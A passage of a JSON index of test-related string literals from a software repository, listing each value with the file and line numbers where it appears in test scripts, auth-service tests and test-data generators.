      "value": "tests, avg score:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:742"
      ]
    },
    "tests.e2e.": {
      "value": "tests.e2e.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:78",
        "scripts/fix_e2e_test_imports.py:79"
      ]
    },
    "tests/": {
      "value": "tests/",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:76"
      ]
    },
    "tests/**/*.py": {
      "value": "tests/**/*.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:55"
      ]
    },
    "tests/**/*_test.py": {
      "value": "tests/**/*_test.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:59"
      ]
    },
    "tests/conftest.py": {
      "value": "tests/conftest.py",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:16"
      ]
    },
    "tests/e2e": {
      "value": "tests/e2e",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:143",
        "scripts/batch_fix_and_test.py:43"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_agent_lifecycle_management.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_agent_lifecycle_management.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:31"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_api_gateway_rate_limiting_accuracy.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_api_gateway_rate_limiting_accuracy.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:32"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_cross_database_transaction_consistency.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_cross_database_transaction_consistency.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:33"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_database_migration_failure_recovery.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_database_migration_failure_recovery.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:34"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_llm_service_integration.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_llm_service_integration.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:35"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_message_persistence_and_retrieval.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_message_persistence_and_retrieval.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:36"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_oauth_database_consistency.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_oauth_database_consistency.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:37"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_service_discovery_failure_cascades.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_service_discovery_failure_cascades.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:38"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_thread_crud_operations_data_consistency.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_thread_crud_operations_data_consistency.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:39"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_websocket_authentication_integration.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_websocket_authentication_integration.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:40"
      ]
    },
    "tests/integration/red_team/tier1_catastrophic/test_websocket_message_broadcasting.py": {
      "value": "tests/integration/red_team/tier1_catastrophic/test_websocket_message_broadcasting.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:41"
      ]
    },
    "tests/integration/red_team/tier2_major_failures/test_clickhouse_data_ingestion_pipeline.py": {
      "value": "tests/integration/red_team/tier2_major_failures/test_clickhouse_data_ingestion_pipeline.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:42"
      ]
    },
    "tests/integration/red_team/tier2_major_failures/test_file_upload_and_storage.py": {
      "value": "tests/integration/red_team/tier2_major_failures/test_file_upload_and_storage.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:43"
      ]
    },
    "tests/integration/red_team/tier2_major_failures/test_redis_session_store_consistency.py": {
      "value": "tests/integration/red_team/tier2_major_failures/test_redis_session_store_consistency.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:44"
      ]
    },
    "tests/integration/staging/test_staging_database_connection_resilience.py": {
      "value": "tests/integration/staging/test_staging_database_connection_resilience.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:45"
      ]
    },
    "tests/integration/user_flows/test_conversion_paths.py": {
      "value": "tests/integration/user_flows/test_conversion_paths.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:46"
      ]
    },
    "tests/integration/user_flows/test_early_tier_flows.py": {
      "value": "tests/integration/user_flows/test_early_tier_flows.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:47"
      ]
    },
    "tests/integration/user_flows/test_enterprise_flows.py": {
      "value": "tests/integration/user_flows/test_enterprise_flows.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:48"
      ]
    },
    "tests/integration/user_flows/test_free_tier_onboarding.py": {
      "value": "tests/integration/user_flows/test_free_tier_onboarding.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:49"
      ]
    },
    "tests/integration/user_flows/test_mid_tier_flows.py": {
      "value": "tests/integration/user_flows/test_mid_tier_flows.py",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:50"
      ]
    },
    "tests/test_api_agent_generation_critical.py": {
      "value": "tests/test_api_agent_generation_critical.py",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:507"
      ]
    },
    "tests/test_api_core_critical.py": {
      "value": "tests/test_api_core_critical.py",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:507"
      ]
    },
    "tests/test_api_endpoints_critical.py": {
      "value": "tests/test_api_endpoints_critical.py",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:507"
      ]
    },
    "tests/test_api_error_handling_critical.py": {
      "value": "tests/test_api_error_handling_critical.py",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:507"
      ]
    },
    "tests/test_api_threads_messages_critical.py": {
      "value": "tests/test_api_threads_messages_critical.py",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:507"
      ]
    },
    "tests/test_example_message_flow.py": {
      "value": "tests/test_example_message_flow.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:47"
      ]
    },
    "tests/test_example_message_integration.py": {
      "value": "tests/test_example_message_integration.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:52"
      ]
    },
    "tests/test_super_e2e.py": {
      "value": "tests/test_super_e2e.py",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:199"
      ]
    },
    "tests/test_system_startup.py": {
      "value": "tests/test_system_startup.py",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:43"
      ]
    },
    "tests:": {
      "value": "tests:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:480"
      ]
    },
    "tests\\.unified\\.e2e\\.": {
      "value": "tests\\.unified\\.e2e\\.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:78"
      ]
    },
    "tests_passed": {
      "value": "tests_passed",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:96",
        "scripts/iterative_test_fix_loop.py:110",
        "scripts/iterative_test_fix_loop.py:149",
        "scripts/iterative_test_fix_loop.py:162"
      ]
    },
    "testuser@example.com": {
      "value": "testuser@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:121"
      ]
    },
    "text": {
      "value": "text",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:436",
        "auth_service/tests/test_security.py:320",
        "scripts/compliance/fake_test_scanner.py:386",
        "scripts/compliance/fake_test_scanner.py:387",
        "scripts/compliance/fake_test_scanner.py:433",
        "scripts/compliance/test_refactor_helper.py:674",
        "scripts/compliance/test_refactor_helper.py:674",
        "scripts/compliance/test_size_validator.py:519",
        "scripts/compliance/test_size_validator.py:520",
        "scripts/remove_test_stubs.py:358"
      ]
    },
    "third_party": {
      "value": "third_party",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:113",
        "scripts/compliance/test_refactor_helper.py:134"
      ]
    },
    "thorough": {
      "value": "thorough",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:199",
        "scripts/unified_test_config.py:288"
      ]
    },
    "threshold_based": {
      "value": "threshold_based",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:815"
      ]
    },
    "throughput": {
      "value": "throughput",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:99"
      ]
    },
    "throughput_rps": {
      "value": "throughput_rps",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:167",
        "netra_backend/app/services/realistic_test_data/log_generator.py:175",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:201",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:370"
      ]
    },
    "tier": {
      "value": "tier",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:492",
        "scripts/business_value_test_index.py:494",
        "scripts/business_value_test_index.py:497",
        "scripts/business_value_test_index.py:679"
      ]
    },
    "tier customer data and access control": {
      "value": "tier customer data and access control",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:490"
      ]
    },
    "tier functionality": {
      "value": "tier functionality",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:500"
      ]
    },
    "tier has insufficient test coverage": {
      "value": "tier has insufficient test coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:681"
      ]
    },
    "tier_coverage": {
      "value": "tier_coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:623",
        "scripts/business_value_test_index.py:741"
      ]
    },
    "time": {
      "value": "time",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:131"
      ]
    },
    "time.sleep": {
      "value": "time.sleep",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:281"
      ]
    },
    "time.time": {
      "value": "time.time",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:60"
      ]
    },
    "time_based": {
      "value": "time_based",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:31",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:165",
        "scripts/unified_test_runner.py:840"
      ]
    },
    "time_utilities": {
      "value": "time_utilities",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:22",
        "scripts/analyze_test_mocks.py:61"
      ]
    },
    "timed out": {
      "value": "timed out",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:121"
      ]
    },
    "timeout": {
      "value": "timeout",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:94",
        "netra_backend/app/services/realistic_test_data/models.py:133",
        "auth_service/tests/auth-service-down-critical-scenarios.py:279",
        "auth_service/tests/auth-service-down-critical-scenarios.py:289",
        "scripts/fix_test_batch.py:317",
        "scripts/unified_test_config.py:25",
        "scripts/unified_test_config.py:33",
        "scripts/unified_test_config.py:41",
        "scripts/unified_test_config.py:49",
        "scripts/unified_test_config.py:57"
      ]
    },
    "timeout expired": {
      "value": "timeout expired",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:373"
      ]
    },
    "timeout:test": {
      "value": "timeout:test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:186"
      ]
    },
    "timeout_rate": {
      "value": "timeout_rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:39",
        "netra_backend/app/services/realistic_test_data/models.py:49",
        "netra_backend/app/services/realistic_test_data/models.py:59",
        "netra_backend/app/services/realistic_test_data/models.py:69",
        "netra_backend/app/services/realistic_test_data/models.py:79"
      ]
    },
    "timestamp": {
      "value": "timestamp",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:73",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:106",
        "netra_backend/app/services/realistic_test_data/log_generator.py:50",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:121",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:213",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:327",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:354",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:392",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1499"
      ]
    },
    "timing_test_service": {
      "value": "timing_test_service",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:196",
        "scripts/test_coordination_fixes.py:213",
        "scripts/test_coordination_fixes.py:214",
        "scripts/test_coordination_fixes.py:220"
      ]
    },
    "title": {
      "value": "title",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:284",
        "scripts/test_example_message_flow.py:406"
      ]
    },
    "to": {
      "value": "to",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:763",
        "scripts/comprehensive_test_fixer.py:212"
      ]
    },
    "to <10 within 2 sprints": {
      "value": "to <10 within 2 sprints",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:570"
      ]
    },
    "to sync": {
      "value": "to sync",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:60"
      ]
    },
    "to_dict": {
      "value": "to_dict",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:673"
      ]
    },
    "token": {
      "value": "token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:97",
        "auth_service/tests/auth-service-down-critical-scenarios.py:141",
        "auth_service/tests/auth-service-down-critical-scenarios.py:266",
        "auth_service/tests/auth-service-down-critical-scenarios.py:324",
        "auth_service/tests/auth-service-down-critical-scenarios.py:434",
        "auth_service/tests/auth-service-down-critical-scenarios.py:466",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:512",
        "auth_service/tests/integration/test_oauth_flows_auth.py:48",
        "auth_service/tests/integration/test_oauth_flows_core.py:59",
        "auth_service/tests/integration/test_oauth_flows_sync.py:139"
      ]
    },
    "token1": {
      "value": "token1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:292"
      ]
    },
    "token123": {
      "value": "token123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:537"
      ]
    },
    "token_created": {
      "value": "token_created",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:26"
      ]
    },
    "token_exchange": {
      "value": "token_exchange",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:319",
        "auth_service/tests/integration/test_auth_oauth_errors.py:331",
        "auth_service/tests/integration/test_auth_oauth_errors.py:337",
        "auth_service/tests/integration/test_auth_oauth_errors.py:344"
      ]
    },
    "token_generation": {
      "value": "token_generation",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:51",
        "scripts/test_oauth_local.py:256",
        "scripts/test_oauth_local.py:275",
        "scripts/test_oauth_local.py:282",
        "scripts/test_oauth_local.py:288",
        "scripts/test_oauth_local.py:416",
        "scripts/test_oauth_local.py:416",
        "scripts/test_oauth_local.py:417"
      ]
    },
    "token_limit": {
      "value": "token_limit",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:117"
      ]
    },
    "token_limits": {
      "value": "token_limits",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:45",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:49",
        "netra_backend/app/services/realistic_test_data/models.py:34",
        "netra_backend/app/services/realistic_test_data/models.py:44",
        "netra_backend/app/services/realistic_test_data/models.py:54",
        "netra_backend/app/services/realistic_test_data/models.py:64",
        "netra_backend/app/services/realistic_test_data/models.py:74"
      ]
    },
    "token_refreshed": {
      "value": "token_refreshed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:27"
      ]
    },
    "token_revoked": {
      "value": "token_revoked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:28"
      ]
    },
    "token_type": {
      "value": "token_type",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:208",
        "auth_service/tests/base/test_mixins.py:250",
        "auth_service/tests/base/test_mixins.py:255",
        "auth_service/tests/base/test_mixins.py:259",
        "auth_service/tests/factories/audit_factory.py:138",
        "auth_service/tests/factories/token_factory.py:195",
        "auth_service/tests/factories/token_factory.py:219",
        "auth_service/tests/integration/test_auth_oauth_errors.py:48",
        "auth_service/tests/integration/test_auth_oauth_google.py:57",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:131"
      ]
    },
    "token_validation": {
      "value": "token_validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:52",
        "scripts/test_oauth_local.py:311",
        "scripts/test_oauth_local.py:324",
        "scripts/test_oauth_local.py:335"
      ]
    },
    "too.few.parts": {
      "value": "too.few.parts",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:118"
      ]
    },
    "too.many.parts.here.extra": {
      "value": "too.many.parts.here.extra",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:119"
      ]
    },
    "tool_dispatcher = Mock()": {
      "value": "tool_dispatcher = Mock()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:52"
      ]
    },
    "tool_dispatcher = ToolDispatcher(llm_manager)": {
      "value": "tool_dispatcher = ToolDispatcher(llm_manager)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:54"
      ]
    },
    "top_100": {
      "value": "top_100",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:192"
      ]
    },
    "top_overlaps_by_category": {
      "value": "top_overlaps_by_category",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:360",
        "scripts/analyze_test_overlap.py:422",
        "scripts/analyze_test_overlap.py:572",
        "scripts/analyze_test_overlap.py:573"
      ]
    },
    "top_value_tests": {
      "value": "top_value_tests",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:637",
        "scripts/business_value_test_index.py:754"
      ]
    },
    "total": {
      "value": "total",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:280",
        "scripts/comprehensive_test_fixer.py:299",
        "scripts/comprehensive_test_fixer.py:391",
        "scripts/comprehensive_test_fixer.py:396",
        "scripts/fix_test_batch.py:228",
        "scripts/fix_test_batch.py:255",
        "scripts/fix_test_batch.py:380",
        "scripts/team_updates_test_analyzer.py:104",
        "scripts/team_updates_test_analyzer.py:111",
        "scripts/team_updates_test_analyzer.py:135"
      ]
    },
    "total_agents": {
      "value": "total_agents",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:172"
      ]
    },
    "total_business_value": {
      "value": "total_business_value",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:620"
      ]
    },
    "total_categories": {
      "value": "total_categories",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:899"
      ]
    },
    "total_config_fixes": {
      "value": "total_config_fixes",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:410"
      ]
    },
    "total_cost": {
      "value": "total_cost",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:202",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:223"
      ]
    },
    "total_costs_usd": {
      "value": "total_costs_usd",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:239",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:265"
      ]
    },
    "total_duration": {
      "value": "total_duration",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:208",
        "scripts/test_backend_optimized.py:231",
        "scripts/test_backend_optimized.py:266",
        "scripts/test_backend_optimized.py:329",
        "scripts/unified_test_runner.py:672",
        "scripts/unified_test_runner.py:693"
      ]
    },
    "total_failures": {
      "value": "total_failures",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:195",
        "scripts/test_failure_scanner.py:225",
        "scripts/test_failure_scanner.py:244"
      ]
    },
    "total_fake_tests": {
      "value": "total_fake_tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:83",
        "scripts/compliance/fake_test_scanner.py:115",
        "scripts/compliance/fake_test_scanner.py:140",
        "scripts/compliance/fake_test_scanner.py:259",
        "scripts/compliance/fake_test_scanner.py:416",
        "scripts/compliance/fake_test_scanner.py:442",
        "scripts/compliance/fake_test_scanner.py:455"
      ]
    },
    "total_file_fixes": {
      "value": "total_file_fixes",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:411"
      ]
    },
    "total_files": {
      "value": "total_files",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:89",
        "scripts/check_test_compliance.py:104",
        "scripts/check_test_compliance.py:132",
        "scripts/check_test_compliance.py:143",
        "scripts/check_test_compliance.py:152",
        "scripts/compliance/test_size_validator.py:76",
        "scripts/compliance/test_size_validator.py:420",
        "scripts/compliance/test_size_validator.py:459"
      ]
    },
    "total_files_scanned": {
      "value": "total_files_scanned",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:82",
        "scripts/compliance/fake_test_scanner.py:114",
        "scripts/compliance/fake_test_scanner.py:258",
        "scripts/compliance/fake_test_scanner.py:415",
        "scripts/fix_test_import_errors.py:287",
        "scripts/fix_test_import_errors.py:309"
      ]
    },
    "total_import_fixes": {
      "value": "total_import_fixes",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:409"
      ]
    },
    "total_iterations": {
      "value": "total_iterations",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:85"
      ]
    },
    "total_lines": {
      "value": "total_lines",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:63",
        "scripts/analyze_test_overlap.py:407",
        "scripts/analyze_test_overlap.py:562",
        "scripts/compliance/demo_test_size_enforcement.py:88",
        "scripts/compliance/test_refactor_helper.py:100",
        "scripts/compliance/test_refactor_helper.py:706"
      ]
    },
    "total_llm_cost": {
      "value": "total_llm_cost",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:100",
        "scripts/real_service_test_metrics.py:151"
      ]
    },
    "total_methods": {
      "value": "total_methods",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:329"
      ]
    },
    "total_requests": {
      "value": "total_requests",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72"
      ]
    },
    "total_similarity_pairs": {
      "value": "total_similarity_pairs",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:350",
        "scripts/analyze_test_overlap.py:525"
      ]
    },
    "total_test_files": {
      "value": "total_test_files",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:348",
        "scripts/analyze_test_overlap.py:523",
        "scripts/check_test_compliance.py:132",
        "scripts/check_test_compliance.py:160"
      ]
    },
    "total_test_functions": {
      "value": "total_test_functions",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:349",
        "scripts/analyze_test_overlap.py:470",
        "scripts/analyze_test_overlap.py:524",
        "scripts/analyze_test_overlap.py:656"
      ]
    },
    "total_tests": {
      "value": "total_tests",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:62",
        "scripts/analyze_test_overlap.py:406",
        "scripts/analyze_test_overlap.py:474",
        "scripts/analyze_test_overlap.py:561",
        "scripts/business_value_test_index.py:73",
        "scripts/business_value_test_index.py:539",
        "scripts/business_value_test_index.py:596",
        "scripts/business_value_test_index.py:596",
        "scripts/business_value_test_index.py:597",
        "scripts/business_value_test_index.py:619"
      ]
    },
    "total_tokens": {
      "value": "total_tokens",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:76",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:109",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:117",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:202",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:224",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:239"
      ]
    },
    "total_tracked_tests": {
      "value": "total_tracked_tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:298"
      ]
    },
    "total_violations": {
      "value": "total_violations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:82",
        "scripts/compliance/test_size_validator.py:118",
        "scripts/compliance/test_size_validator.py:423",
        "scripts/compliance/test_size_validator.py:462",
        "scripts/compliance/test_size_validator.py:544",
        "scripts/remove_test_stubs.py:260",
        "scripts/remove_test_stubs.py:310"
      ]
    },
    "totals": {
      "value": "totals",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:123",
        "scripts/test_backend.py:411"
      ]
    },
    "trace_id": {
      "value": "trace_id",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:59"
      ]
    },
    "traceback": {
      "value": "traceback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:439"
      ]
    },
    "traceparent": {
      "value": "traceparent",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:687"
      ]
    },
    "tracestate": {
      "value": "tracestate",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:688"
      ]
    },
    "traffic_data": {
      "value": "traffic_data",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72"
      ]
    },
    "trigger": {
      "value": "trigger",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:24",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:31",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:38",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:45",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:163",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:165"
      ]
    },
    "trivial tests for refactoring": {
      "value": "trivial tests for refactoring",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:207"
      ]
    },
    "true": {
      "value": "true",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:49",
        "auth_service/tests/config/test_env.py:50",
        "auth_service/tests/config/test_env.py:175",
        "auth_service/tests/config/test_env.py:185",
        "auth_service/tests/conftest.py:33",
        "auth_service/tests/test_auth_startup_integration.py:41",
        "auth_service/tests/test_auth_startup_integration.py:44",
        "auth_service/tests/test_database_manager.py:180",
        "auth_service/tests/test_postgres_compliance.py:127",
        "auth_service/tests/test_postgres_compliance.py:182"
      ]
    },
    "tsc": {
      "value": "tsc",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:335"
      ]
    },
    "typ": {
      "value": "typ",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:211",
        "auth_service/tests/unified/test_jwt_validation.py:86",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:80",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:89",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:100",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:134",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:143",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:152",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:172",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:188"
      ]
    },
    "type": {
      "value": "type",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:67",
        "auth_service/tests/factories/token_factory.py:38",
        "auth_service/tests/factories/token_factory.py:133",
        "scripts/analyze_test_mocks.py:104",
        "scripts/analyze_test_mocks.py:125",
        "scripts/analyze_test_mocks.py:180",
        "scripts/analyze_test_overlap.py:427",
        "scripts/analyze_test_overlap.py:578",
        "scripts/business_value_test_index.py:660",
        "scripts/business_value_test_index.py:668"
      ]
    },
    "typescript": {
      "value": "typescript",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:75",
        "scripts/test_frontend.py:103",
        "scripts/test_frontend.py:103"
      ]
    },
    "ultra_fast": {
      "value": "ultra_fast",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:89",
        "scripts/test_backend_optimized.py:182",
        "scripts/test_backend_optimized.py:374"
      ]
    },
    "unauthorized_client": {
      "value": "unauthorized_client",
      "category": "test_literals",
